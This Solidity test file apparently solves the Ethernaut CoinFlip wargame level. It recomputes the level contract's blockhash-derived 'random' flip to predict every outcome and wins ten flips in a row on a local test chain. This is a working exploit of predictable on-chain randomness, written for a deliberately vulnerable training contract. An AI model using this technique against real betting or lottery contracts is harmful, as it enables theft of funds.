pragma solidity ^0.8.17;

import "ds-test/test.sol";
import "../src/CoinFlip/CoinFlipFactory.sol";
import "../src/Ethernaut.sol";
import "./utils/vm.sol";

contract FallbackTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        // fund the eoa address
        vm.deal(eoaAddress, 5 ether);
    }

    function testCoinFlipHack() public {
        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);

        // use eoa address
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));

        // START
        vm.roll(5);

        for (uint i = 0; i < 10; i++) {
            bool guess = getGuess();
            bool correct = ethernautCoinFlip.flip(guess);
            assert(correct);

            vm.roll(6 + i);
        }

        assertEq(ethernautCoinFlip.consecutiveWins(), 10);
        // END

        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }

    function getGuess() private returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;

        return side;
    }
}